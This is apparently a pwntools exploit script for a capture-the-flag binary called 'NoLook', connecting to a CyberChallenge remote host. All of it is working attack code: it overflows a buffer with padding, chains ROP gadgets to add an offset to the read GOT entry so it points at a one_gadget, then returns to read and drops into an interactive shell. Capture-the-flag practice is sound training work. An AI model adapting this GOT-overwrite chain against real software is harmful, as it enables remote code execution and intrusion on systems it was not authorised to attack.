from pwn import *

exe = ELF("/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 10/NoLook/nolook")
context.binary = exe
r = remote("nolook.challs.cyberchallenge.it", 6015)

p = make_packer(64, endian='little', sign='signed')

print("\n[+] Exploiting...")

local_read_addr = 0x001f0aa0
remote_read_addr = 0x00210070
one_gadg_rel = 0x14f322
local_one_gadg_rel = 0x1cd7b0
local_offset = local_one_gadg_rel - local_read_addr
remote_offset = one_gadg_rel - remote_read_addr

read_loc = 0x0000000000601018

read_instr_addr = 0x000000000040060c

offset = 24

popr14_r15 = p64(0x0000000000400680)  #: pop r14; pop r15; ret;
add_r14_r15 = p64(0x00000000004005af)  #: add qword ptr [r14 + 0x90], r15; ret;

padding = b"A" * offset
payload = padding
payload += popr14_r15
payload += p64(read_loc - 0x90)
payload += p(remote_offset)
payload += add_r14_r15
payload += p64(read_instr_addr)
payload += b"\x00" * 100

r.sendline(payload)
r.interactive()
